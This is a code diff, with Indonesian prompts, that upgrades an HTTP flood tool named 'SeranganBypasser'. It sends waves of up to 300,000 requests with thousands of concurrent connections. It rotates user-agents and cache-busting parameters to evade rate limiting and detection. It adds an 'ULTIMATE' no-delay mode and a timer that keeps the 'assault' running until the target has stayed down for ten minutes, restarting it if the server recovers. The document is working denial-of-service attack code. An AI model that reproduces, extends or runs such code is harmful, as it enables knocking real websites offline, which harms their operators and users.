@@ -42,6 +42,10 @@ class SeranganBypasser:
         self.proxies = []
         # Header cache for high performance
         self.header_cache = [self.generate_realistic_headers() for _ in range(200)]
+        # Server down tracking
+        self.server_down_start_time = None
+        self.server_down_duration = 10 * 60  # 10 minutes in seconds
+        self.current_server_down = False
         
     def load_user_agents(self):
         """Database User-Agents untuk bypass detection"""
@@ -186,8 +190,34 @@ class SeranganBypasser:
         start_time = time.time()
         
         try:
-            # Random jitter untuk bypass rate limiting
-            await asyncio.sleep(random.uniform(0.001, 0.1))
+            # ULTRA MODE: Skip all bypass logic for raw power
+            if config.get('ultra_mode'):
+                # Simple GET request like ultimate.py
+                method = "GET"
+                headers = {"User-Agent": random.choice(self.user_agents)}
+                
+                # Add URL parameters to trigger larger responses
+                target_url = target
+                if '?' in target_url:
+                    target_url += f"&_={random.randint(1,999999)}&size=1024"
+                else:
+                    target_url += f"?_={random.randint(1,999999)}&size=1024"
+                
+                async with session.request(
+                    method=method,
+                    url=target_url,
+                    headers=headers,
+                    ssl=False,  # Skip SSL for speed
+                    timeout=aiohttp.ClientTimeout(total=5),
+                    allow_redirects=True
+                ) as response:
+                    content = await response.read()
+                    response_time = time.time() - start_time
+                    return HasilSerangan(response.status, response_time, len(content), None, time.time())
+            
+            # Standard bypass mode with jitter
+            if not config.get('high_performance'):
+                await asyncio.sleep(random.uniform(0.001, 0.1))
             
             # Random method selection
             methods = ["GET", "POST", "PUT", "HEAD", "OPTIONS"] if config.get('enable_method_mix') else ["GET", "POST"]
@@ -237,18 +267,31 @@ class SeranganBypasser:
     async def bypass_wave_attack(self, targets: List[str], config: dict) -> List[HasilSerangan]:
         """Execute wave attack dengan bypass techniques"""
         
-        # Ultra aggressive connector settings for maximum throughput
-        connector = aiohttp.TCPConnector(
-            limit=config['max_concurrent'] * 3,  # 3x multiplier for maximum connections
-            limit_per_host=config['max_concurrent'],  # Full concurrent per target
-            use_dns_cache=True,  # Use DNS cache for speed
-            enable_cleanup_closed=True,
-            force_close=False,  # Keep-alive for better performance
-            ttl_dns_cache=300,
-            ssl=self.create_ssl_context()
-        )
-        
-        timeout = aiohttp.ClientTimeout(total=45, connect=20)
+        # Connector settings based on mode
+        if config.get('ultra_mode'):
+            # ULTRA MODE: Maximum performance like ultimate.py
+            connector = aiohttp.TCPConnector(
+                limit=config['max_concurrent'] * 5,  # 5x multiplier
+                limit_per_host=config['max_concurrent'] * 2,  # Higher per-host
+                use_dns_cache=True,
+                enable_cleanup_closed=False,  # No cleanup for speed
+                force_close=False,  # Keep-alive
+                ttl_dns_cache=600,  # Long DNS cache
+                ssl=False  # Skip SSL context for speed
+            )
+            timeout = aiohttp.ClientTimeout(total=5, connect=2)  # Shorter timeout
+        else:
+            # Standard aggressive connector
+            connector = aiohttp.TCPConnector(
+                limit=config['max_concurrent'] * 3,  # 3x multiplier
+                limit_per_host=config['max_concurrent'],
+                use_dns_cache=True,
+                enable_cleanup_closed=True,
+                force_close=False,
+                ttl_dns_cache=300,
+                ssl=self.create_ssl_context()
+            )
+            timeout = aiohttp.ClientTimeout(total=30, connect=15)
         
         hasil_wave = []
         
@@ -271,9 +314,11 @@ class SeranganBypasser:
                     hasil_wave.append(result)
                     return result
             
-            # Execute with optimized batching for high performance
+            # Execute with optimized batching based on mode
             total_requests = config['request_per_wave']
-            if config.get('high_performance'):
+            if config.get('ultra_mode'):
+                batch_size = min(config['max_concurrent'] * 10, 10000)  # Maximum batches for ultra
+            elif config.get('high_performance'):
                 batch_size = min(config['max_concurrent'] * 2, 5000)  # Larger batches for speed
             else:
                 batch_size = min(config['max_concurrent'], 1000)  # Standard batches
@@ -292,8 +337,10 @@ class SeranganBypasser:
                 except Exception as e:
                     self.console.print(f"⚠️ Batch error (continuing): {e}")
                 
-                # High performance batch delay
-                if config.get('high_performance'):
+                # Ultra/High performance batch delay
+                if config.get('ultra_mode'):
+                    pass  # No delay at all for ultra mode
+                elif config.get('high_performance'):
                     await asyncio.sleep(0.001)  # Almost no delay for max speed
                 elif config.get('enable_adaptive_delay'):
                     recent_errors = len([r for r in hasil_wave[-100:] if r.kode_status != 200])
@@ -331,41 +378,76 @@ class SeranganBypasser:
                 targets = ["https://example.com"]
 
         # Attack intensity
-        self.console.print("\n⚡ [bold yellow]High Performance Intensity:[/bold yellow]")
-        self.console.print("1. Stealth (5000 req/wave)")
-        self.console.print("2. Balanced (15000 req/wave)")
-        self.console.print("3. Aggressive (40000 req/wave)")
-        self.console.print("4. NUCLEAR (75000 req/wave)")
-        self.console.print("5. APOCALYPSE (100000+ req/wave)")
+        self.console.print("\n⚡ [bold yellow]Attack Intensity:[/bold yellow]")
+        self.console.print("1. Light (10,000 req/wave)")
+        self.console.print("2. Medium (30,000 req/wave)")
+        self.console.print("3. Heavy (70,000 req/wave)")
+        self.console.print("4. BRUTAL (150,000 req/wave)")
+        self.console.print("5. APOCALYPSE (300,000+ req/wave)")
         
-        intensity = Prompt.ask("Pilih intensity", choices=["1","2","3","4","5"], default="3")
+        intensity = Prompt.ask("Pilih intensity", choices=["1","2","3","4","5"], default="4")
         intensitas_map = {
-            "1": (5000, 100),    # Increased from 1000->5000
-            "2": (15000, 300),   # Increased from 5000->15000
-            "3": (40000, 800),   # Increased from 15000->40000
-            "4": (75000, 1500),  # Increased from 30000->75000
-            "5": (100000, 2000)  # Increased from 75000->100000
+            "1": (10000, 200),    # Light
+            "2": (30000, 600),    # Medium
+            "3": (70000, 1200),   # Heavy
+            "4": (150000, 2500),  # Brutal
+            "5": (300000, 5000)   # Apocalypse
         }
         request_per_wave, max_concurrent = intensitas_map[intensity]
         
-        # Enhanced bypass features
-        enable_method_mix = Confirm.ask("🔀 [bold blue]Enable method mixing (GET/POST/PUT)?[/bold blue]", default=True)
-        enable_payloads = Confirm.ask("📤 [bold blue]Enable realistic payloads?[/bold blue]", default=True)
-        enable_human_simulation = Confirm.ask("🤖 [bold blue]Enable human behavior simulation?[/bold blue]", default=False)  # Default false for speed
-        enable_adaptive_delay = Confirm.ask("⚡ [bold blue]Enable adaptive delay (smart rate limiting)?[/bold blue]", default=False)  # Default false for speed
-        high_performance = Confirm.ask("🚀 [bold red]Enable HIGH PERFORMANCE mode?[/bold red] (max throughput)", default=True)
+        # Power mode selection
+        self.console.print("\n🔥 [bold red]Bypass Power Mode:[/bold red]")
+        self.console.print("1. Stealth (Maximum Bypass, Low Throughput)")
+        self.console.print("2. Balanced (Good Bypass, Medium Throughput)")
+        self.console.print("3. Aggressive (Basic Bypass, High Throughput)")
+        self.console.print("4. ULTIMATE (Minimal Bypass, Maximum Throughput)")
+        
+        power_mode = Prompt.ask("Pilih mode", choices=["1", "2", "3", "4"], default="4")
+        
+        # Set features based on power mode
+        if power_mode == "1":  # Stealth
+            enable_method_mix = True
+            enable_payloads = True
+            enable_human_simulation = True
+            enable_adaptive_delay = True
+            high_performance = False
+            ultra_mode = False
+        elif power_mode == "2":  # Balanced
+            enable_method_mix = True
+            enable_payloads = True
+            enable_human_simulation = False
+            enable_adaptive_delay = True
+            high_performance = True
+            ultra_mode = False
+        elif power_mode == "3":  # Aggressive
+            enable_method_mix = True
+            enable_payloads = False
+            enable_human_simulation = False
+            enable_adaptive_delay = False
+            high_performance = True
+            ultra_mode = False
+        else:  # ULTIMATE
+            enable_method_mix = False
+            enable_payloads = False
+            enable_human_simulation = False
+            enable_adaptive_delay = False
+            high_performance = True
+            ultra_mode = True
         
         # Duration settings
-        duration_mode = Prompt.ask("⏰ [bold cyan]Duration mode[/bold cyan] (1=Until Down, 2=Time Limit)", 
-                                 choices=["1", "2"], default="2")
+        duration_mode = Prompt.ask("⏰ [bold cyan]Duration mode[/bold cyan] (1=Until Confirmed Down, 2=Time Limit)", 
+                                 choices=["1", "2"], default="1")
         
         time_limit = None
         if duration_mode == "2":
-            time_limit = IntPrompt.ask("🕐 Batas waktu serangan (menit)?", default=15)
+            time_limit = IntPrompt.ask("🕐 Batas waktu serangan (menit)?", default=30)
         
-        # Error threshold
-        error_threshold = IntPrompt.ask("🚨 [bold red]Error threshold untuk deteksi DOWN (%)?[/bold red]", 
-                                      default=95, show_default=True)
+        # Server down confirmation settings
+        server_down_threshold = IntPrompt.ask("🚨 [bold red]Error threshold untuk deteksi DOWN (%)?[/bold red]", 
+                                            default=95, show_default=True)
+        
+        server_down_minutes = IntPrompt.ask("⏱️ [bold red]Konfirmasi server DOWN setelah berapa menit?[/bold red]", 
+                                          default=10, show_default=True)
         
         return {
             'targets': targets,
@@ -376,8 +458,11 @@ class SeranganBypasser:
             'enable_human_simulation': enable_human_simulation,
             'enable_adaptive_delay': enable_adaptive_delay,
             'high_performance': high_performance,
+            'ultra_mode': ultra_mode,
+            'power_mode': power_mode,
             'time_limit': time_limit,
-            'error_threshold': error_threshold
+            'server_down_threshold': server_down_threshold,
+            'server_down_duration': server_down_minutes * 60  # Convert to seconds
         }
 
     def create_live_bypasser_dashboard(self, wave_count: int, hasil_terkini: List[HasilSerangan], 
@@ -445,6 +530,13 @@ class SeranganBypasser:
         dashboard.add_row("🎯 Target Status", target_status, "🔥")
         dashboard.add_row("🛡️ Bypass Status", bypass_status, "🎯")
         
+        # Add server down tracking to dashboard
+        if self.current_server_down and self.server_down_start_time:
+            down_duration = time.time() - self.server_down_start_time
+            remaining_time = max(0, self.server_down_duration - down_duration)
+            down_status = f"{int(down_duration//60)}m {int(down_duration%60)}s (⏰ {int(remaining_time//60)}m left)"
+            dashboard.add_row("💀 Server Down Timer", down_status, "⏱️")
+        
         return dashboard
 
     async def ultimate_bypass_assault(self, config: dict):
@@ -476,15 +568,40 @@ class SeranganBypasser:
                 
                 current_time = time.time() - self.waktu_mulai
                 
-                # Smart detection of server down
+                # Smart detection of server down with confirmation timer
                 if hasil_wave:
                     sukses = len([r for r in hasil_wave if r.kode_status in [200, 201, 202, 204]])
                     success_rate = (sukses / len(hasil_wave)) * 100
                     error_rate = 100 - success_rate
                     
-                    if error_rate >= config['error_threshold']:
-                        self.server_hancur = True
-                        break
+                    # Check if server appears to be down
+                    if error_rate >= config['server_down_threshold']:
+                        # Server appears down
+                        if not self.current_server_down:
+                            # First detection of server down
+                            self.current_server_down = True
+                            self.server_down_start_time = time.time()
+                            self.console.print(f"🚨 [bold red]SERVER APPEARS DOWN! Starting {config['server_down_duration']//60} minute confirmation timer...[/bold red]")
+                        
+                        # Calculate how long server has been down
+                        down_duration = time.time() - self.server_down_start_time
+                        remaining_seconds = max(0, config['server_down_duration'] - down_duration)
+                        remaining_minutes = int(remaining_seconds // 60)
+                        remaining_secs = int(remaining_seconds % 60)
+                        
+                        self.console.print(f"⏱️ [bold yellow]Server down for: {int(down_duration//60)}m {int(down_duration%60)}s | Confirming in: {remaining_minutes}m {remaining_secs}s[/bold yellow]")
+                        
+                        # Only stop if server has been down for the full duration
+                        if down_duration >= config['server_down_duration']:
+                            self.console.print(f"💀 [bold red]SERVER CONFIRMED DOWN FOR {config['server_down_duration']//60} MINUTES. MISSION ACCOMPLISHED![/bold red]")
+                            self.server_hancur = True
+                            break
+                    else:
+                        # Server appears to be responding again
+                        if self.current_server_down:
+                            self.console.print("🔄 [bold green]SERVER RECOVERED! Resetting down timer and continuing assault![/bold green]")
+                            self.current_server_down = False
+                            self.server_down_start_time = None
                 
                 dashboard = self.create_live_bypasser_dashboard(wave_count, hasil_wave, current_time, config)
                 self.console.print(dashboard)
@@ -494,9 +611,11 @@ class SeranganBypasser:
                     self.console.print("\n⏰ [bold yellow]Time limit reached![/bold yellow]")
                     break
                 
-                # High performance mode: minimal delay
-                if config.get('high_performance'):
-                    await asyncio.sleep(0.1)  # Minimal delay for maximum throughput
+                # Mode-based wave delay
+                if config.get('ultra_mode'):
+                    pass  # No delay between waves for ultra mode
+                elif config.get('high_performance'):
+                    await asyncio.sleep(0.01)  # Minimal delay for maximum throughput
                 elif config.get('enable_adaptive_delay') and hasil_wave:
                     recent_blocks = len([r for r in hasil_wave if r.kode_status in [403, 429, 503]])
                     block_rate = (recent_blocks / len(hasil_wave)) * 100
@@ -508,7 +627,7 @@ class SeranganBypasser:
                     else:
                         await asyncio.sleep(0.05)  # Minimal delay
                 else:
-                    await asyncio.sleep(0.5)  # Reduced from 2 seconds
+                    await asyncio.sleep(0.1)  # Reduced delay
                     
         except KeyboardInterrupt:
             self.console.print("\n🛑 [bold red]BYPASS ASSAULT TERMINATED![/bold red]")
